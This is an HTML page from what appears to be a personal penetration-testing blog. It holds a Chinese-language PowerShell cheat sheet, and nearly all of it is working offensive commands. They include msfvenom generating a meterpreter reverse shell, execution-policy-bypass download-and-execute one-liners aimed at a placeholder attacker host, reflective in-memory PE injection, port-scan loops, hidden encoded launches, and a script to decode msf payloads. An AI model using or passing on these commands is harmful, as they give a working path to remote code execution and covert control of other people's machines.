@@ -1,0 +1,363 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Powershell | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="反弹123端口的powershell
+msfvenom -p windows&amp;#x2F;x64&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp LHOST&amp;#x3D;x.x.x. LPORT&amp;#x3D;123 -f psh-reflection &amp;gt;123.ps1
+powershell.exe -exec Bypass -nop -c &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http:&amp;#x2F;&amp;#x2F;x.x.x.x&amp;#x2F;123.ps1&amp;#39;)&amp;quot;
+
+
+端口扫描:
+powershell -exec bypass -c &amp;quot;444..446 | % &amp;#123;echo ((new-object Net.Sockets.TcpClient).Connect(&amp;#39;x.x.x.x&amp;#39;,$_)) &amp;quot;Port $_ is open!&amp;quot;&amp;#125; 2&amp;gt;$null&amp;quot;
+
+自定义端口和IP
+1..20 | % &amp;#123; $a &amp;#x3D; $_; 1..1024 | % &amp;#123;echo ((new-object Net.Sockets.TcpClient).Connect(&amp;quot;192.168.1.$a&amp;quot;,$_)) &amp;quot;Port $_ is open!&amp;quot;&amp;#125; 2&amp;gt;$null&amp;#125;
+
+
+1..20 | % &amp;#123; $a &amp;#x3D; $_; write-host &amp;quot;------&amp;quot;; write-host &amp;quot;192.168.1.$a&amp;quot;; 22,53,80,445 | % &amp;#123;echo ((new-object Net.Sockets.TcpClient).Connect(&amp;quot;10.0.0.$a&amp;quot;,$_)) &amp;quot;Port $_ is open!&amp;quot;&amp;#125; 2&amp;gt;$null&amp;#125;
+169..171 | % &amp;#123; $a &amp;#x3D; $_; write-host &amp;quot;------&amp;quot;; write-host &amp;quot;103.27.177.$a&amp;quot;; 445 | % &amp;#123;echo ((new-object Net.Sockets.TcpClient).Connect(&amp;quot;10.0.0.$a&amp;quot;,$_)) &amp;quot;Port $_ is open!&amp;quot;&amp;#125; 2&amp;gt;$null&amp;#125;
+
+
+
+powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx
+
+内存加载运行:
+powershell.exe -exec bypass -nop -c &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https:&amp;#x2F;&amp;#x2F;raw.githubusercontent.com&amp;#x2F;clymb3r&amp;#x2F;PowerShell&amp;#x2F;master&amp;#x2F;Invoke-ReflectivePEInjection&amp;#x2F;Invoke-ReflectivePEInjection.ps1&amp;#39;);Invoke-ReflectivePEInjection -PEUrl http:&amp;#x2F;&amp;#x2F;x.x.x.x&amp;#x2F;2.exe -ExeArgs &amp;#39;whoami&amp;#39; -ForceASLR&amp;quot; 
+
+
+下载文件:
+(New-Object System.Net.Webclient).DownloadFile(&amp;quot;http:&amp;#x2F;&amp;#x2F;x.x.x.x&amp;#x2F;k.aspx&amp;quot;,&amp;quot;&amp;quot;)
+
+
+
+http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/
+
+在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:
+python decode.py 1.txt
+
+#&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;env python
+# coding:utf-8
+
+import base64
+import gzip
+import StringIO
+import sys
+
+f &amp;#x3D; sys.argv[1]
+with open(f, &amp;quot;rb&amp;quot;) as file:
+    data &amp;#x3D; file.read()
+
+decoded&amp;#x3D;base64.b64decode(data)
+res &amp;#x3D; StringIO.StringIO(decoded)
+for i in gzip.GzipFile(fileobj&amp;#x3D;res):
+    print i"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Powershell"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Powershell</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
+msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
+powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;
+
+
+端口扫描:
+powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;
+
+自定义端口和IP
+1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
+
+
+
+powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx
+
+内存加载运行:
+powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 
+
+
+下载文件:
+(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
+</ul>
+<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
+<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+# coding:utf-8
+
+import base64
+import gzip
+import StringIO
+import sys
+
+f &#x3D; sys.argv[1]
+with open(f, &quot;rb&quot;) as file:
+    data &#x3D; file.read()
+
+decoded&#x3D;base64.b64decode(data)
+res &#x3D; StringIO.StringIO(decoded)
+for i in gzip.GzipFile(fileobj&#x3D;res):
+    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2018/06/13/powershell-pen.html" class="leancloud-visitors view" data-flag-title="Powershell">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2018/07/05/stack.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2018/06/05/local-network-pentest.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2018-06-13 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
